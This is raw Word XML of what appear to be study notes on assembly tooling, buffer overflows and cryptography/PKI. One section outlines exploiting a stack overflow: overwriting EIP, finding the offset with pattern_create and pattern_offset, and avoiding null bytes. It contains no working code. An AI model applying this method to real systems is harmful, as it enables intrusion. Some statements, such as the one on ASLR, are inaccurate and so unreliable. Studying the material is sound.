    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005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Netwide Assembler (NASM)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x86 architecture used to write 16-bit, 32-bit (IA-32) and 64-bit (x86-64) programs, one of the most popular assemblers for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05A">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Flat Assembler (FASM)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x86, supports Intel-style assembly language on the IA-32 and x86-64.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005B">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Linker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takes object file from assembler and creates an executable</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005C">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Assembly → Code</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005D">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ASM → Assembler → Object File (eg. Kernel32.dll and user32.ll) → Linker → Executable </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005E">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ab/>
          <w:tab/>
          <w:tab/>
          <w:t xml:space="preserve">           → Static Library → Linker → Executable</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005F">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idnfpltalhp" w:id="16"/>
        <w:bookmarkEnd w:id="1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Compiler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006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Converts high level source code (eg. c) into low level code or directly into an object file.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006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pj4hy51o03r" w:id="17"/>
        <w:bookmarkEnd w:id="1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NASM</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006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Netwide Assembler/</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000063">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NASM-x project of macros,includes etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table1"/>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064">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Nasm -f win32 demo1</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 demo1.obj</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000065">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tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table2"/>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066">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Golink</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/entry _main demo1</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.obj</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kernel32</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.dell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use32.dll</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000067">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2zkt17om9pc" w:id="18"/>
        <w:bookmarkEnd w:id="18"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000068">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s9w61jji7yb" w:id="19"/>
        <w:bookmarkEnd w:id="1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ASM Basics</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000069">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062413" cy="2492844"/>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62413" cy="2492844"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006A">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Subroutines are implemented via</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006B">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Call → pushes current EIP to stack and jumps to the function address specified. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006C">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Compiler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table3"/>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06D">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gcc -m32 codefile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w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006E">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-m32 compile for 32 bit environment</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000006F">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 output compiled version to a file</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000070">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Decompiler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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Objdump - disassemble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executable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files</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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Into a text file with; addresses in memory, opcodes, assembly codes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table4"/>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073">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Objdump -d -Mintel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code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&gt; disasm.txt</w:t>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000074">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Mintell is the architecture for</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000075">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76">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77">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2gl7g1b321z" w:id="20"/>
        <w:bookmarkEnd w:id="2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Buffer Overflows</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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Strcpy does not check for bounds</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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Strncpy the ‘safe’ version that asks for the length of the buffer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000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Where to go to execute another function that you control?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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objdump to get the disassembly</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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find the address of the instruction of the function and overwrite the eip</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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→overflow with unique characters at the end to see where the error occurs (occurring because app cannot execute the instruction at that specific point , overwritten)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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→replace eip with address of function</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000007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8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When str cpy encounters a null byte it stops copying string data, therefore payload must be free of null bytes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008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hxs4emlah2e" w:id="21"/>
        <w:bookmarkEnd w:id="21"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000082">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3ytz5k5jhxc" w:id="22"/>
        <w:bookmarkEnd w:id="2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Finding Buffer Overflows</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008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unsafe operations eg:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000084">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Strcpy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000085">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Strcat</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000086">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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gets/fgets</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000087">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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scanf/fscanf</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000088">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Memcpy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000089">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Printf</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Vsprintf</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008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Languages that provide raw access to memory. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008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8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Fuzzing </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008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Provide invalid data/ random inputs; via command line, network data, shared memory regions → memory/cpu hogging, crashes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000008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Finding Overflow</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009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Inserting large amounts of data to crash and find the EIP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offset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is hard, use scripting tools. Eg.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pattern_create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&amp;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pattern_offset </w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009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.patterncreate.rb 100 → output is used as argument. Find value overwritten (ie at the end of the error message ) input into pattern_offset.rb 0xVALUE</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009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will give the offset required</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009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When ASLR is enabled , kernel32.dll functions are at fixed addresses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009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o1leg08mwq10" w:id="23"/>
        <w:bookmarkEnd w:id="2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STEPS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000009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9F">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l8pojb6h6t0" w:id="24"/>
        <w:bookmarkEnd w:id="2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Cryptography and Password Cracking</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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Cryptography → comm secretly</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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Encryption → message into a ciphertext ( not understandable by a human)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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Decryption → retrieve original message from ciphertext with correct key </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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4bmujhy15oq" w:id="25"/>
        <w:bookmarkEnd w:id="2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Classification</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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7v1fogsnvhw" w:id="26"/>
        <w:bookmarkEnd w:id="2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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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Symmetric-key → sender and receiver share the same key. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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DES</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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AES</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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RC4</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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Blowfish</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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Public-Key / Asymmetric → two keys for each party. Public key and a private key</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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if a message is encrypted with “X’s” public key, only “X’s” private can decrypt it.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000AC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>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Based on Factorisation problems (no known way to find all factors of big numbers)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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qae1sxalago" w:id="27"/>
        <w:bookmarkEnd w:id="2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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000A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Types of Algorithms</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000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Block-Cipher → handles data in blocks ( chunks of bytes) eg. DES, AES.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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There are multiple modes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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ECB ( electronic code book) / depreciated → each ‘chunk’ of data is encrypted separately </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>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CBC ( cipher block chaining) → each ‘chunk’ of data is derived from the previous blocks (key for next block from cipher text). An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initialisation vector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is used for the first block</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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Stream-Cipher → one byte at a time eg. RC4</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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B5">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useouiyw9rb" w:id="28"/>
        <w:bookmarkEnd w:id="2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Cryptographic Hash Function  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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Properties</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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Preimage resistance → cant find original message</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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Second preimage resistance → given input, can't find another input with same hash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B9">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B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uuz1d308z2q" w:id="29"/>
        <w:bookmarkEnd w:id="2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Public Key Infrastructure</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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Hardware / software/ people / policies to control digital certificates </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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Verify identity, must be unique for each Certificate Identity</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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certificate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binds a public key with an identity, so only that identity can decrypt it</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000B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B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1ikujo24m4c" w:id="30"/>
        <w:bookmarkEnd w:id="3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Public Key Certificates Standards</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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X.509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using protocols like ssl/tls/ mime and ipsec ect</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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 .DER , .PEM, .P7C</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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n8jtf193rh0" w:id="31"/>
        <w:bookmarkEnd w:id="3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SSL Certificates</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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Provide proof of identity &amp; provide secure channel for transmitting data</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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Root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ertificate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uthority signs certificates of intermediate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which sign SSL certificates of Websites</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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EG&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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visits a Website (browser stores public key of the root CA) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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verifies SSL Certificate, public key of signer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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C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C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C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h1r48ucbtfw" w:id="32"/>
        <w:bookmarkEnd w:id="3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SSL</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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Secure sockets layer → protocol to communicate securely</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000CD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>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Uses PKI’s and Symmetric Key encryption to establish communication channels between two entities.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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mqqt19whobp" w:id="33"/>
        <w:bookmarkEnd w:id="3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Digital Signature</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000C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Authenticate a message</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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Original message is hashed and signed( algorithm such as DSA, RSA) with private key .</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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can be checked by;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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 receiver Decrypting signature with public key and comparing if it is the same hash value as hashing the message sent.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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khryof2ryyj" w:id="34"/>
        <w:bookmarkEnd w:id="3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PGP (pretty good privacy)</w:t>
        </w:r>
      </w:ins>
